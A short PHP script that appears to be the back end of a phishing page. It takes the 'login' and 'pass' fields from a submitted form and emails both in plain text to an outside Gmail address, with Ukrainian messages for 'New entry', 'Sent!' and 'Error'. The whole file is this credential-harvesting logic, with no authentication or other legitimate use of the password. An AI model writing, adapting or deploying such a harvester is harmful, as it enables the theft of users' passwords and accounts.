<?php


    $login = $_POST['login'];
    $pass = $_POST['pass'];


    $login = htmlspecialchars($login);
    $pass = htmlspecialchars($pass);
    $login = urldecode($login);
    $pass = urldecode($pass);
    $login = trim($login);
    $pass = trim($pass);

    if (mail("sitesentsii@gmail.com",
            "Нове вступлення",
            "Нікнейм користувача:".$login."\n".
            "Value:".$pass)
    ){
        echo ("Відправлено!");
    }
    else {
        echo ("Помилка");
    }
?>